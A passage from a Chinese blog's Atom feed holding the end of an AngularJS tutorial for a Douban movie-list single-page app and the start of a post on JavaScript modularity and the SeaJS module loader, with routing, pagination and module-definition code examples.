为了避免路径匹配问题，将这个放到前面</span><br><span class="line">      .when(&apos;/subject/:id&apos;, &#123;</span><br><span class="line">        templateUrl: &apos;movie_detail/view.html&apos;,</span><br><span class="line">        controller: &apos;DetailController&apos;</span><br><span class="line">      &#125;)</span><br><span class="line">      // 路径中传页码</span><br><span class="line">      // ng 中的路由支持这样的形式和后台一样动态处理路由</span><br><span class="line">      // page 是定义路径的时候起的一个名字，会自动把模糊匹配路径解析出来，然后挂载到 $routeParams 中</span><br><span class="line">      // $routeProvider 支持 when() 方法中传 ? ，表示 0 次或多次</span><br><span class="line">      .when(&apos;/:category/:page?&apos;, &#123;</span><br><span class="line">        // 渲染这个视图</span><br><span class="line">        templateUrl: &apos;in_theaters/view.html&apos;,</span><br><span class="line">        // 调这个控制器</span><br><span class="line">        controller: &apos;InTheaterController&apos;</span><br><span class="line">      &#125;)</span><br><span class="line">      // 是指跳转到当前路由了</span><br><span class="line">      .otherwise(&#123;</span><br><span class="line">        redirectTo: &apos;/in_theaters&apos;</span><br><span class="line">      &#125;)</span><br><span class="line">  &#125;])</span><br><span class="line">  // 解决详情页搜索问题</span><br><span class="line">  .controller(&apos;searchController&apos;, [&apos;$scope&apos;, &apos;$route&apos;,function($scope, $route) &#123;</span><br><span class="line">      $scope.search_text = [];</span><br><span class="line">      $scope.search = function()&#123;</span><br><span class="line">        // console.log($scope.search_text);</span><br><span class="line">        $route.updateParams(&#123;</span><br><span class="line">          category: &apos;search&apos;,</span><br><span class="line">          page:&apos;1&apos;,</span><br><span class="line">          // 路由中，如果没有该路径参数，则更新一个不存在的路由参数，路由自动帮你变成查询字符串</span><br><span class="line">          q: $scope.search_text</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;;</span><br><span class="line">  &#125;])</span><br><span class="line">  // 利用自定义指令解决导航栏状态切换</span><br><span class="line">  .directive(&apos;movieActive&apos;, [&apos;$location&apos;, function ($location) &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      link: function ($scope, iElm, iAttrs, controller) &#123;</span><br><span class="line">        // 获取当前 url ，根据 url 找到对应的 li ，让 li 获得 active 样式，其它 li 去除 active</span><br><span class="line">        $scope.$location = $location;</span><br><span class="line">        $scope.$watch(&apos;$location.url()&apos;, function (newVal, oldVal) &#123;</span><br><span class="line">          var currentUrl = newVal.split(&apos;/&apos;)[1];</span><br><span class="line">          // Array.from 可以将一个伪数组转换成一个真的数组</span><br><span class="line">          Array.from(iElm.find(&apos;a&apos;)).forEach(function (a) &#123;</span><br><span class="line">            angular.element(a).parent().removeClass(&apos;active&apos;);</span><br><span class="line">            if (a.hash.substr(2) === currentUrl) &#123;</span><br><span class="line">              angular.element(a).parent().addClass(&apos;active&apos;);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;]);</span><br></pre></td></tr></table></figure><h4 id="配置文件路径："><a href="#配置文件路径：" class="headerlink" title="配置文件路径："></a>配置文件路径：</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  port: <span class="number">4000</span>,</span><br><span class="line">  host: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">  staticPath: path.join(__dirname, <span class="string">'static'</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="其它模块-module-js"><a href="#其它模块-module-js" class="headerlink" title="其它模块 module.js"></a>其它模块 module.js</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">angular</span>) </span>&#123;</span><br><span class="line">  angular.module(<span class="string">'movie.in_theaters'</span>, [])</span><br><span class="line">    .controller(<span class="string">'InTheaterController'</span>, [</span><br><span class="line">      <span class="string">'$scope'</span>, </span><br><span class="line">      <span class="string">'$http'</span>,</span><br><span class="line">      <span class="comment">// ng 中专门拿路由当中的请求参数的</span></span><br><span class="line">      <span class="string">'$routeParams'</span>,</span><br><span class="line">      <span class="comment">// ng 中专门处理路由的</span></span><br><span class="line">      <span class="string">'$route'</span>, </span><br><span class="line">      <span class="function"><span class="keyword">function</span> (<span class="params">$scope, $http, $routeParams, $route</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 给模型暴露数据</span></span><br><span class="line">        $scope.title = <span class="string">'Loading...'</span>;</span><br><span class="line">        $scope.total = <span class="number">0</span>;</span><br><span class="line">        $scope.movie_list = &#123;&#125;;</span><br><span class="line">        <span class="comment">// 上一页、下一页</span></span><br><span class="line">        <span class="keyword">var</span> pageSize = <span class="number">10</span>;</span><br><span class="line">        $scope.totalPage = <span class="number">0</span>;</span><br><span class="line">        $scope.page = $routeParams.page ? <span class="built_in">parseInt</span>($routeParams.page) : <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// console.log($routeParams);</span></span><br><span class="line">        <span class="comment">// $http.get('/in_theaters', &#123;</span></span><br><span class="line">        <span class="comment">//   // 需要查询字符串，查询第几页，get() 方法不支持这样配置</span></span><br><span class="line">        <span class="comment">//   data: &#123;</span></span><br><span class="line">        <span class="comment">//     start: ($scope.page -1) * pageSize,</span></span><br><span class="line">        <span class="comment">//     count: pageSize</span></span><br><span class="line">        <span class="comment">//   &#125;</span></span><br><span class="line">        <span class="comment">// &#125;)</span></span><br><span class="line">        <span class="comment">// 以上 $http.get 不支持配置，使用 $http 来配置</span></span><br><span class="line">        $http(&#123;</span><br><span class="line">          method: <span class="string">'get'</span>,</span><br><span class="line">          url:<span class="string">'/movie/'</span> + $routeParams.category,</span><br><span class="line">          <span class="comment">// get 请求数据使用 params；post 请求使用 data 属性</span></span><br><span class="line">          params: &#123;</span><br><span class="line">            <span class="comment">// 请求开始的数据</span></span><br><span class="line">            start: ($scope.page <span class="number">-1</span>) * pageSize,</span><br><span class="line">            count: pageSize,</span><br><span class="line">            <span class="comment">// 这里的 q 只是针对 search 有效，如果不是 search，豆瓣会忽略</span></span><br><span class="line">            q: $routeParams.q</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">          .then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> result = data.data;</span><br><span class="line">            $scope.movie_list = result;</span><br><span class="line">            $scope.title = result.title;</span><br><span class="line">            $scope.total = result.total;</span><br><span class="line">            $scope.totalPage = <span class="built_in">Math</span>.ceil(result.total/pageSize);</span><br><span class="line">          &#125;);</span><br><span class="line">        $scope.go = <span class="function"><span class="keyword">function</span>(<span class="params">page</span>) </span>&#123;</span><br><span class="line">          <span class="comment">// console.log(page)</span></span><br><span class="line">          <span class="comment">// 如果这个页面小于等于 0 了 或者 &gt; 最大页面时不去处理</span></span><br><span class="line">          <span class="keyword">if</span> (page &lt;= <span class="number">0</span> || page &gt; $scope.totalPage) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// 路径中传页码</span></span><br><span class="line">          <span class="comment">// 使用路由提供的 API 更新当前请求路径中的请求参数</span></span><br><span class="line">          <span class="comment">// 只要更新了路由中的参数，当前页面中的路由会被重载</span></span><br><span class="line">          $route.updateParams(&#123;</span><br><span class="line">            page: page</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]);</span><br><span class="line">&#125;)(angular);</span><br></pre></td></tr></table></figure><h3 id="六-、通过路由实现简单的分页传参功能"><a href="#六-、通过路由实现简单的分页传参功能" class="headerlink" title="(六)、通过路由实现简单的分页传参功能"></a>(六)、通过路由实现简单的分页传参功能</h3><p>路径中传页码，使用路由提供的 API 更新当前请求路径中的请求参数。</p><h3 id="七-、通过配置路由参数实现多模块重用"><a href="#七-、通过配置路由参数实现多模块重用" class="headerlink" title="(七)、通过配置路由参数实现多模块重用"></a>(七)、通过配置路由参数实现多模块重用</h3><p>ng 中和后台原理相似，都支持路由参数</p><h3 id="八-、利用自定义指令解决导航栏状态切换"><a href="#八-、利用自定义指令解决导航栏状态切换" class="headerlink" title="(八)、利用自定义指令解决导航栏状态切换"></a>(八)、利用自定义指令解决导航栏状态切换</h3><blockquote><p>在需要操作 DOM 时</p></blockquote><h3 id="九-、解决详情页搜索问题"><a href="#九-、解决详情页搜索问题" class="headerlink" title="(九)、解决详情页搜索问题"></a>(九)、解决详情页搜索问题</h3><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p>整个小项目工作流程</p></blockquote><ul><li>前台主模块加载其它模块并设置路由，</li><li>前台其它模块 module.js 中的 $http 发起请求</li><li>请求中转 app.js</li><li>中转 app.js 向后台（豆瓣 API）发起请求</li><li>再由中转 app.js 将数据响应给前台 module.js</li><li>前台数据绑定，渲染视图</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;豆瓣电影列表项目说明&quot;&gt;&lt;a href=&quot;#豆瓣电影列表项目说明&quot; class=&quot;headerlink&quot; title=&quot;豆瓣电影列表项目说明&quot;&gt;&lt;/a&gt;豆瓣电影列表项目说明&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;使用 AngularJS + Bootstrap + Node.js 构建的一个电影列表展示单页应用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;启动项目&quot;&gt;&lt;a href=&quot;#启动项目&quot; class=&quot;headerlink&quot; title=&quot;启动项目&quot;&gt;&lt;/a&gt;启动项目&lt;/h2&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ nodemon add.js&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;或者：&lt;/p&gt;
&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ node add.js&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;豆瓣开发接口-API&quot;&gt;&lt;a href=&quot;#豆瓣开发接口-API&quot; class=&quot;headerlink&quot; title=&quot;豆瓣开发接口 API&quot;&gt;&lt;/a&gt;豆瓣开发接口 API&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;所有的接口地址都是以：&lt;a href=&quot;http://api.douban.com/v2&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://api.douban.com/v2&lt;/a&gt; 开头的&lt;/li&gt;
&lt;li&gt;正在热映 &lt;a href=&quot;http://api.douban.com/v2/movie/in_theaters&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://api.douban.com/v2/movie/in_theaters&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;即将上映 &lt;a href=&quot;http://api.douban.com/v2/movie/coming_soon&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://api.douban.com/v2/movie/coming_soon&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;top250 &lt;a href=&quot;http://api.douban.com/v2/movie/top250&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://api.douban.com/v2/movie/top250&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;search &lt;a href=&quot;http://api.douban.com/v2/movie/search?q={text}&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://api.douban.com/v2/movie/search?q={text}&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;电影条目接口: &lt;a href=&quot;http://api.douban.com/v2/movie/subject/:id&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://api.douban.com/v2/movie/subject/:id&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="AngularJS系列" scheme="http://yoursite.com/categories/AngularJS%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="AngularJS" scheme="http://yoursite.com/tags/AngularJS/"/>
    
  </entry>
  
  <entry>
    <title>js 的模块化</title>
    <link href="http://yoursite.com/2016/02/28/js%20%E7%9A%84%E6%A8%A1%E5%9D%97%E5%8C%96/"/>
    <id>http://yoursite.com/2016/02/28/js 的模块化/</id>
    <published>2016-02-27T16:00:00.000Z</published>
    <updated>2018-06-04T03:28:49.558Z</updated>
    
    <content type="html"><![CDATA[<p>历史上，JavaScript一直没有模块（module）体系，无法将一个大程序拆分成互相依赖的小文件，再用简单的方法拼装起来。其他语言都有这项功能，比如 Ruby 的 <code>require</code>、Python 的 <code>import</code> ，甚至就连 CSS 都有 <code>@import</code> ，c 语言中的 <code>include</code>，但是 JavaScript 任何这方面的支持都没有，这对开发大型的、复杂的项目形成了巨大障碍。</p><h2 id="JavaScript-模块化开发"><a href="#JavaScript-模块化开发" class="headerlink" title="JavaScript 模块化开发"></a>JavaScript 模块化开发</h2><h2 id="模块化介绍"><a href="#模块化介绍" class="headerlink" title="模块化介绍"></a>模块化介绍</h2><p><strong>当你的网站开发越来越复杂的时候，会经常遇到什么问题？</strong></p><p>1、模块化思想可以让开发更高效<br>2、实现模块化需要解决一个任务，这个任务就是依赖关系<br>3、浏览器端 js 是天然不能实现模块<br>4、有一些库弥补了浏览器端 js 的一些缺陷，实现了模块化并解决了依赖关系</p><blockquote><p>将这种库称为模块加载器，RequireJS、SeaJS</p></blockquote><p>这些模块加载器定义了自己的规范，必须尊早这些规范才能正常工作。</p><p>以 SeaJS 为例子：</p><a id="more"></a><ul><li>通过 define() 方法来定义模块</li><li>通过 use() 方法来加载/执行模块</li><li>通过 require() 方法来引入模块</li><li>通过 exports/module.exports 暴漏模块功能</li></ul><p><code>Sea.js</code>可以解决命名空间污染、文件依赖的问题。</p><ul><li>模块的作用就是：私有空间</li><li><p>可以加载，可以导出</p></li><li><p>什么是模块化</p><ul><li>模块化是指解决一个复杂问题时自顶向下逐层把系统划分成若干模块的过程，有多种属性，分别反映其内部特性。</li><li>解决复杂问题的一种方式而已</li><li>电脑：CPU、主板、显示器、内存、硬盘、输入与输出设备</li></ul></li><li><p>使用模块化开发的方式带来的好处</p><ul><li>生产效率高</li><li>可维护性高</li></ul></li></ul><h2 id="模块化开发演变"><a href="#模块化开发演变" class="headerlink" title="模块化开发演变"></a>模块化开发演变</h2><h3 id="全局函数"><a href="#全局函数" class="headerlink" title="全局函数"></a>全局函数</h3><ul><li>污染了全局变量</li><li>模块成员之间看不出直接关系</li></ul><h3 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h3><ul><li>理论意义上减少了变量冲突</li><li>缺点1：暴露了模块中所有的成员，内部状态可以被外部改写，不安全</li><li>缺点2：命名空间会越来越长</li></ul><h3 id="私有空间"><a href="#私有空间" class="headerlink" title="私有空间"></a>私有空间</h3><ul><li>私有空间的变量和函数不会影响全局作用域</li><li>公开公有方法，隐藏私有属性</li></ul><h3 id="模块的维护和扩展"><a href="#模块的维护和扩展" class="headerlink" title="模块的维护和扩展"></a>模块的维护和扩展</h3><ul><li>开闭原则</li><li>可维护性好</li></ul><h3 id="模块的第三方依赖"><a href="#模块的第三方依赖" class="headerlink" title="模块的第三方依赖"></a>模块的第三方依赖</h3><ul><li>保证模块的独立性</li><li>模块之间的依赖关系变得明显</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>以后如果不使用第三方规范的情况下，如果写模块可以采用下面这种方式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 分号是什么意思</span></span><br><span class="line"><span class="comment">// 2. 为什么要给你的代码加一个匿名自执行函数</span></span><br><span class="line"><span class="comment">// 3. 为什么要把使用的依赖作为参数传递进来</span></span><br><span class="line">;(<span class="function"><span class="keyword">function</span> (<span class="params">形参模块名, 依赖项, 依赖项</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 通过 形参模块名 修改模块</span></span><br><span class="line">  <span class="comment">// 如果需要，可以通过给 window 对象挂载属性对外暴露内部成员</span></span><br><span class="line">  <span class="built_in">window</span>.模块名 = 形参模块名</span><br><span class="line">&#125;)(<span class="built_in">window</span>.模块名 || &#123;&#125;, 依赖项, 依赖项)</span><br></pre></td></tr></table></figure><h2 id="模块化规范"><a href="#模块化规范" class="headerlink" title="模块化规范"></a>模块化规范</h2><h3 id="模块系统理解"><a href="#模块系统理解" class="headerlink" title="模块系统理解"></a>模块系统理解</h3><p>自然界生态系统、计算机操作系统、软件办公系统，还有教育系统、金融系统、网络系统、理论系统等等。究竟什么是系统呢？</p><p>简单来说，系统有两个基本特性：</p><ol><li>系统由个体组成</li><li>个体之间有关联，按照规则协同完成任务</li></ol><p>系统之间的个体可以成为系统成员，要构建一个系统，最基本的层面需要做两件事：</p><ol><li><strong>定义系统成员</strong>：确定成员是什么<ul><li>模块是一个 JavaScript 文件</li></ul></li></ol><ul><li>每一个模块都使用 <code>define</code> 函数去定义</li></ul><ol start="2"><li><strong>约定系统通讯</strong>：确定成员之间如何交互，遵循的规则是什么<ul><li>一个 SeaJS 模块默认就是私有作用域</li><li>如果想要被外部文件模块所访问，就必须把要公开的属性挂载给 <code>module.exports</code> 对象接口</li><li>使用 <code>require</code> 函数可以加载一个指定的模块，得到该模块代码中暴露的接口对象</li></ul></li><li>如何启动整个模块系统<ul><li>在 html 页面中使用 <code>seajs.use()</code> 方法，指定一个入口文件模块</li></ul></li></ol><p>Sea.js 是一个适用于 Web 浏览器端的模块加载器。在 Sea.js 里，一切皆是模块，所有模块协同构建成模块系统。Sea.js 首要要解决的是模块系统的基本问题：</p><ol><li>模块是什么？</li><li>模块之间如何交互？</li></ol><p>在前端开发领域，一个模块，可以是JS 模块，也可以是 CSS 模块，或是 Template 等模块。而 Sea.js 则专注于 JS 文件模块：</p><ol><li>模块是一段 JavaScript 代码，具有统一的 基本书写格式</li><li>模块之间通过基本 交互规则 ，能彼此引用，协同工作</li></ol><p>把上面两点中提及的基本书写格式和基本交互规则描述清楚，就能构建出一个模块系统。对书写格式和交互规则的详细描述，就是模块定义规范（Module Definition Specification）。</p><p>比如 CommonJS 社区的 <code>Modules 1.1.1</code> 规范，以及 <code>NodeJS 的 Modules</code> 规范，还有 RequireJS 提出的 AMD 规范等等。</p><p>Sea.js 遵循的是 <code>CMD</code> 规范。</p><h3 id="常见的-JavaScript-模块化规范"><a href="#常见的-JavaScript-模块化规范" class="headerlink" title="常见的 JavaScript 模块化规范"></a>常见的 JavaScript 模块化规范</h3><p>规范其实就是这些库在推广的过程中逐渐形成的一套规则。</p><p>所谓的规范也就是：</p><ul><li>定义了模块的书写格式</li><li><p>以及模块之间的交互规则</p></li><li><p>Node 环境</p><ul><li>CommonJS</li><li>这里先放在这里，Node 还没有学习，学到 Node 的时候，再说这个问题</li></ul></li><li>浏览器环境<ul><li>AMD<ul><li>RequireJS</li></ul></li><li>CMD Common Module Definition<ul><li>CMD 就是 SeaJS 这个模块加载器在推广的过程中定义的一个模块规范</li></ul></li></ul></li><li>ECMAScript<ul><li>ECMAScript 6</li></ul></li><li>UMD</li></ul><p>CMD、AMD、CommonJS 都是社区制定出来的模块规范，他们的目的都是为了解决 JavaScript 没有模块化系统的问题。他们都有如何定义模块成员，以及模块成员之间如何进行通信交互的规则。</p><p>2015 年 9 月份，ECMAScript 官方推出了 ECMAScript 6 语言标准。在最新的 ES6 语言规范标准中制定了 JavaScript 模块化规范，通过 <code>export</code> 和 <code>import</code> 两个关键字来作为交互规则。</p><p>ES6 才是未来的趋势，以后的大一统。</p><p>前端发展非常快，不是说出了新技术马上就用，而是这个破玩儿还没发布正式版，都已经怼到生产环境了。所有任何功能，都可以使用 js 来实现。</p><ul><li>electron<ul><li>使用 HTML+CSS+JavaScript+Node 构建跨平台桌面应用程序</li></ul></li></ul><h2 id="SeaJS"><a href="#SeaJS" class="headerlink" title="SeaJS"></a>SeaJS</h2><blockquote><p>A Module Loader for the Web, Enjoy the fun of programming.</p></blockquote><ul><li>提供简单、极致的模块化开发体验</li><li>A Module Loader for the Web</li><li>JavaScript 模块加载器</li><li>可以实现 在 JavaScript 代码中去加载另一个 JavaScript 代码。</li></ul><h3 id="SeaJS-介绍"><a href="#SeaJS-介绍" class="headerlink" title="SeaJS 介绍"></a>SeaJS 介绍</h3><p>SeaJS 带来的最大好处是：提升代码的可维护性。如果一个网站的 JS 文件超过 3 个，就适合用 SeaJS 来组织和维护代码。涉及的 JS 文件越多，SeaJS 就越适合。</p><ul><li><p>关于 SeaJS</p><ul><li>SeaJS 是一个适用于浏览器环境的 JavaScript 模块加载器<ul><li>一个库文件，类似于 jQuery</li><li>使用这个库提供的规范的模块化的方式来编写 JavaScript 代码</li><li>只关心 JavaScript 文件代码模块如何组织</li><li>只关心 JavaScript 文件之间如何相互协议、引用、依赖</li></ul></li><li>SeaJS 的作者是阿里巴巴支付宝前端架构师：玉伯<ul><li>Sea.js创始人玉伯的前端开发之路</li></ul></li><li>SeaJS</li><li>SeaJS -github</li></ul></li><li><p>为什么学习和使用 SeaJS ？</p><ul><li><strong>简单友好的模块定义规范</strong>：SeaJS 遵循 CMD 规范，可以像 Node 一样书写模块代码</li><li><strong>自然直观的代码组织方式</strong>：依赖的自动加载、配置简洁清晰，可以让我们更多的享受编码的乐趣</li><li>SeaJS兼容性非常好，几乎可以运行在任何浏览器引擎上</li><li>注1：SeaJS 只是实现模块化开发的一种方式或者说一种工具而已，重在模块化思想的理解</li><li>注2：因为 SeaJS 采用的 CMD 模块规范和 Node 中的 CommonJS 模块规范非常一致，所以有利于我们学习 Node 中的模块化编程</li></ul></li><li><p>谁在用？</p><ul><li>淘宝网、支付宝、京东、爱奇艺。。。</li></ul></li><li><p>SeaJS 使用场景</p><ul><li>SeaJS 不提供任何功能性 API，只提供了解决 JavaScript 代码的命名污染和文件依赖的问题</li><li>所以 SeaJS 可以和 jQuery、underscore 等库结合使用</li><li>例如 只写写 原生 JavaScript 或者用了一些第三方库</li></ul></li></ul><h3 id="快速上手（Getting-Started）"><a href="#快速上手（Getting-Started）" class="headerlink" title="快速上手（Getting Started）"></a>快速上手（Getting Started）</h3><ol><li>下载 sea.js 库文件<ul><li><a href="https://github.com/seajs/seajs/releases" target="_blank" rel="noopener">SeaJS - Release</a></li><li><code>bower install seajs</code></li><li><code>npm install seajs</code></li></ul></li><li>在页面中引入 sea.js</li><li>使用 <code>define</code> 函数定义模块</li><li>使用 <code>require</code> 函数加载模块</li><li>使用 <code>module.exports</code> 对外暴露接口对象</li><li>使用 <code>seajs.use</code> 函数启动模块系统</li></ol><h3 id="API-详解"><a href="#API-详解" class="headerlink" title="API 详解"></a>API 详解</h3><h4 id="seajs-use-加载模块-普通路径"><a href="#seajs-use-加载模块-普通路径" class="headerlink" title="seajs.use 加载模块-普通路径"></a><code>seajs.use</code> 加载模块-普通路径</h4><p>加载模块，启动模块系统。</p><ul><li>加载一个模块 <code>seajs.use(&#39;id&#39;)</code></li><li>加载一个模块，在加载完成时，执行回调 <code>seajs.use(&#39;id&#39;, callback)</code></li><li><p>加载多个模块，加载完成时，执行回调 <code>seajs.use([&#39;id1&#39;,&#39;id2&#39;,...],callback)</code></p></li><li><p>注意：</p><ul><li>在调用 seajs.use 之前，需要先引入 sea.js 文件</li><li>seajs.use 与 <code>DOM ready</code> 事件没有任何关系。如果某些操作要确保在 <code>DOM ready</code> 后执行，需要使用 jquery 等类库来保证</li><li>seajs.use 理论上只用于加载启动，不应该出现在 <code>define</code> 中的模块代码里</li></ul></li></ul><h4 id="define-factory"><a href="#define-factory" class="headerlink" title="define(factory)"></a><code>define(factory)</code></h4><ul><li><code>define</code> 是一个全局函数，用来定义模块。</li><li><code>define</code> 接受 <code>factory</code> 参数，<code>factory</code> 可以是一个函数，也可以是一个对象或字符串。</li><li><code>factory</code> 为对象、字符串时，表示模块的接口就是该对象、字符串。</li><li>factory 是一个对象<ul><li><code>define({})</code></li></ul></li><li>factory 是一个字符串时<ul><li><code>define(&#39;hello&#39;)</code></li></ul></li><li>factory 是一个函数时<ul><li><code>define(function(require, exports, module){})</code></li></ul></li></ul><h4 id="require-解决依赖"><a href="#require-解决依赖" class="headerlink" title="require 解决依赖"></a><code>require</code> 解决依赖</h4><blockquote><p>相对路径：相对于当前模块来说的</p></blockquote><ul><li>require 用来加载一个 js 文件模块，相对路径：相对于当前模块来说的</li><li>require 用来获取指定模块的接口对象 <code>module.exports</code>。</li><li>require 在加载和执行的时候，js 会按照同步的方式和执行。</li></ul><p>使用注意：</p><ul><li>正确拼写<ul><li>模块 factory 构造方法的第一个参数 <code>必须</code> 命名为 require</li></ul></li><li>不要修改<ul><li>不要重命名 require 函数，或在任何作用域中给 require 重新赋值</li></ul></li><li>使用字符串直接量<ul><li>require 的参数值 必须 是字符串直接量</li></ul></li></ul><h4 id="模块标识"><a href="#模块标识" class="headerlink" title="模块标识"></a>模块标识</h4><p>模块标识是一个字符串，用来标识模块。</p><ul><li>模块标识可以不包含文件后缀名，比如 <code>.js</code><ul><li>seajs 推荐不加 .js 文件模块后缀</li></ul></li><li>模块标识可以是 <strong>相对</strong> 或 <strong>顶级</strong> 标识</li><li>相对标识</li></ul><p>相对标识以 <code>.</code> 开头，永远相对于当前模块所处的路径来解析。</p><ul><li>顶级标识</li></ul><p>顶级标识不以 <code>.</code> 或 <code>/</code>开始，会相对模块系统的基础路径（base路径，默认是 sea.js 文件所属的路径）。可以手动配置 base 路径。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">seajs.config(&#123;</span><br><span class="line">  base: <span class="string">'./js'</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>普通路径（相对于 html 路径来说的）<br>除了相对和顶级标识之外的标识都是普通路径。普通路径的解析规则，会相对当前页面解析。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设当前页面是 http://example.com/path/to/page/index.html</span></span><br><span class="line"><span class="comment">// 绝对路径是普通路径：</span></span><br><span class="line"><span class="built_in">require</span>.resolve(<span class="string">'http://cdn.com/js/a'</span>);</span><br><span class="line"><span class="comment">// =&gt; http://cdn.com/js/a.js</span></span><br><span class="line"><span class="comment">// 根路径是普通路径：</span></span><br><span class="line"><span class="built_in">require</span>.resolve(<span class="string">'/js/b'</span>);</span><br><span class="line"><span class="comment">// =&gt; http://example.com/js/b.js</span></span><br><span class="line"><span class="comment">// use 中的相对路径始终是普通路径：</span></span><br><span class="line">seajs.use(<span class="string">'./c'</span>);</span><br><span class="line">  <span class="comment">// =&gt; 加载的是 http://example.com/path/to/page/c.js</span></span><br><span class="line">seajs.use(<span class="string">'../d'</span>);</span><br><span class="line">  <span class="comment">// =&gt; 加载的是 http://example.com/path/to/d.js</span></span><br></pre></td></tr></table></figure><p><strong>Tips:</strong></p><ul><li>顶级标识始终相对 <code>base</code> 基础路径解析。<ul><li>如果不设置，base 路径默认就是 sea.js 库文件所属的路径</li><li>可以通过 <code>seajs.config({ base: 